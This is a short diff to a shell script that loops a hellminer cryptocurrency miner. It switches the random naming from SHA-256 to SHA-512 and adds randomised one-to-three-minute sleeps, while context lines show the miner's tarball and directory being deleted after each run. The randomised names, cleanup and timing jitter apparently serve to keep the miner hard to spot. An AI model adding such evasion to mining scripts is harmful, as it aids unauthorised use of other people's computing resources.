@@ -1,12 +1,12 @@
 #!/bin/sh
 
-# Function to generate a random name based on SHA-256 hash
+# Function to generate a random name based on SHA-512 hash
 generate_random_name() {
   # Generate random string
   random_string=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12 ; echo '')
 
-  # Calculate SHA-256 hash of random string and trim to 12 characters
-  random_name=$(echo -n "$random_string" | sha256sum | awk '{print substr($1, 1, 12)}')
+  # Calculate SHA-512 hash of random string and trim to 12 characters
+  random_name=$(echo -n "$random_string" | sha512sum | awk '{print substr($1, 1, 12)}')
   echo "$random_name"
 }
 
@@ -37,6 +37,10 @@ while true; do
   rm -f hellminer_linux64_avx2.tar.gz
   rm -rf "$random_name"
   
-  # Pause for 2 minutes before looping again
-  sleep 2m
+  # Generate random sleep time between 1 and 3 minutes
+  sleep_time=$(shuf -i 1-3 -n 1)m
+  echo "Sleeping for $sleep_time"
+  
+  # Pause for random time before looping again
+  sleep $sleep_time
 done
